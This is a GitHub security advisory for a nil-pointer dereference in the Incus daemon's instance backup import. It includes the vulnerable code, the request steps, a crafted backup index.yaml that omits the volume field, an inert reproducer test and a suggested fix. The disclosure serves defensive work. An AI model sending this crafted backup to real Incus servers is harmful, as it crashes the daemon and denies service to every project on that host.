# [M] Incus has a Nil-Pointer Dereference Panic via Instance Backup Import (volume omitted)

## Summary
Severity: Medium
Advisory: GHSA-8g7m-96c8-8wwc
CVE: CVE-2026-47753
CWE: CWE-476
Ecosystem: Go
CVSS: CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:U (CVSS_V4)
Published: 2026-06-10
Source: https://github.com/advisories/GHSA-8g7m-96c8-8wwc
Type: github-advisory

## Affected
- Go: `github.com/lxc/incus/v7` — affected >=0 <7.1.0

## Details
## Summary

`(*backend).CreateInstanceFromBackup` in [`internal/server/storage/backend.go`](https://github.com/lxc/incus/blob/1513600/internal/server/storage/backend.go) contains a nil-pointer dereference that an authenticated user with permission to create instances in any project can trigger remotely by uploading a crafted backup tarball. The Incus daemon panics and the process crashes, causing denial of service to every project on that cluster member.

This is a sibling of `GHSA-fwj8-62r8-8p8m`, `GHSA-r7w7-mmxr-47r9`, and `GHSA-x5r6-jr56-89pv` (all assigned 2026-05-04). Those patches added guards on adjacent fields of the same `backup/config.Config` struct; the `Volume` field on the instance-import path was missed.

## Vulnerable code

[`internal/server/storage/backend.go`](https://github.com/lxc/incus/blob/1513600/internal/server/storage/backend.go) (current `main`, commit `1513600`):

```go
// Lines 763-767 — properly guarded:
var volumeConfig map[string]string
if srcBackup.Config != nil && srcBackup.Config.Volume != nil {
    volumeConfig = srcBackup.Config.Volume.Config
}

// ... a few lines later ...

// Line 795 — unguarded, dereferences Config.Volume directly:
if srcBackup.Config.Volume.Config["block.type"] == drivers.BlockVolumeTypeQcow2 {
```

The caller `createFromBackup` in [`cmd/incusd/instances_post.go`](https://github.com/lxc/incus/blob/1513600/cmd/incusd/instances_post.go) only verifies that `Config` and `Config.Container` are non-nil:

```go
// instances_post.go:854
if bInfo.Config == nil || bInfo.Config.Container == nil {
    return response.BadRequest(errors.New("Backup file is missing required information"))
}
```

`Volume` is not checked. The `Volume` field on `internal/server/backup/config.Config` has type `*api.StorageVolume` with `yaml:"volume,omitempty"`, so omitting `volume:` from a crafted [`backup/index.yaml`](https://github.com/lxc/incus/blob/1513600/backup/index.yaml) decodes to `nil`. The subsequent unguarded deref on line 795 panics.

The panic happens on the HTTP request goroutine; no `recover()` is installed by `CreateInstanceFromBackup` or its callers, so the Go runtime kills the entire `incusd` process.

## Reach

1. The attacker is any client authenticated to the Incus REST API (TLS client certificate, OIDC, or unix socket) with permission to create instances in at least one project. This is the most common low-trust authenticated user.
2. The attacker sends `POST /1.0/instances?project=<p>` with `Content-Type: application/octet-stream`.
3. The body is an uncompressed tar (the same code path also accepts squashfs / gz / zstd / xz) containing one file, [`backup/index.yaml`](https://github.com/lxc/incus/blob/1513600/backup/index.yaml), whose `config:` block lists `container:` and `pool:` but omits `volume:`.
4. [`cmd/incusd/instances_post.go`](https://github.com/lxc/incus/blob/1513600/cmd/incusd/instances_post.go) `instancesPost` -> `createFromBackup` -> the line 854 guard passes (Container is non-nil) -> `pool.CreateInstanceFromBackup(*bInfo, backupFile, nil)` -> [`internal/server/storage/backend.go:795`](https://github.com/lxc/incus/blob/1513600/internal/server/storage/backend.go#L795) panics on `srcBackup.Config.Volume.Config[...]`.
5. `incusd` process dies. All running operations on that cluster member are killed. Repeated requests = persistent denial of service.

Minimal crafted [`backup/index.yaml`](https://github.com/lxc/incus/blob/1513600/backup/index.yaml):

```yaml
name: poc
backend: dir
pool: default
type: container
optimized: false
optimized_header: false
config:
  container:
    name: poc
    architecture: x86_64
    type: container
  pool:
    name: default
    driver: dir
  # volume intentionally absent
```

## Proof of concept

A self-contained Go unit test imports the real `internal/server/backup/config` package, decodes the crafted YAML into the actual `*backupConfig.Config` struct used by the daemon, and executes the literal expression from [`backend.go:795`](https://github.com/lxc/incus/blob/1513600/backend.go#L795). The test is intentionally inert (panics are recovered and reported as the expected outcome):

```go
// internal/poc_repro/poc_nil_deref_volume_test.go
func TestPoCNilDerefVolumeImport(t *testing.T) {
    var bi pocInfo // mirrors internal/server/backup.Info, only Config is needed
    loader, _ := yaml.NewLoader(strings.NewReader(evilIndex))
    _ = loader.Load(&bi)

    // bi.Config != nil, bi.Config.Container != nil (passes createFromBackup guard)
    // bi.Config.Volume == nil (passes the line 765 guard's else branch)

    defer func() { _ = recover() }()

    // Literal copy of backend.go:795.
    if bi.Config.Volume.Config["block.type"] == "qcow2" {
        // unreachable
    }
}
```

Result against `lxc/incus@1513600` on Go 1.26.1:

```
=== RUN   TestPoCNilDerefVolumeImport
    poc_nil_deref_volume_test.go:97: yaml decoded: Container != nil (passes createFromBackup guard), Volume == nil
    poc_nil_deref_volume_test.go:99: backend.go line 795 unguarded deref about to execute...
    poc_nil_deref_volume_test.go:123: CONFIRMED: nil-pointer panic at the exact line as backend.go:795 => runtime error: invalid memory address or nil pointer dereference
--- PASS: TestPoCNilDerefVolumeImport (0.00s)
```

A tarball builder + uploader (`main.go`) is included in the report's PoC bundle. The tarball is 2560 bytes and contains a single 547-byte [`backup/index.yaml`](https://github.com/lxc/incus/blob/1513600/backup/index.yaml).

## Impact

- **Severity:** denial of service against the entire `incusd` process. Every container / VM operation on the host (and on the cluster member, if clustered) is aborted; subsequent requests fail until the process is restarted by an operator or supervisor.
- **Privileges required:** authenticated user with `can_create` permission on any project. The path is not behind the admin auth tier.
- **Network attack surface:** the Incus REST API on `:8443` (or unix socket).
- **CWE-476** — nil pointer dereference. **CVSS estimate:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H).

## Suggested fix

Mirror the guard already present on line 765 a few lines higher into the path that hits line 795. For example:

```go
if srcBackup.Config == nil || srcBackup.Config.Volume == nil {
    return nil, nil, errors.New("Backup config missing required volume metadata")
}

if srcBackup.Config.Volume.Config["block.type"] == drivers.BlockVolumeTypeQcow2 {
```

Alternatively, extend the existing `createFromBackup` precondition in [`cmd/incusd/instances_post.go:854`](https://github.com/lxc/incus/blob/1513600/cmd/incusd/instances_post.go#L854) to also reject backups missing `bInfo.Config.Volume`. The latter is the smaller surface change and matches the pattern of `CreateBucketFromBackup` ([`backend.go:7848`](https://github.com/lxc/incus/blob/1513600/backend.go#L7848)):

```go
if srcBackup.Config == nil || srcBackup.Config.Bucket == nil {
    return errors.New("Valid bucket config not found in index")
}
```

## Reporter notes

Reported via Privately-Reported Vulnerability against `lxc/incus`. Reporter: tonghuaroot. The reproducer test is non-destructive (no network, no filesystem mutation beyond the temp directory used by Go's test runner) and recovers the panic.

## References
- https://github.com/lxc/incus/security/advisories/GHSA-8g7m-96c8-8wwc
- https://github.com/lxc/incus/commit/98e64f0a6fcfdc9676eea0246418d490c53297bf
- https://github.com/lxc/incus
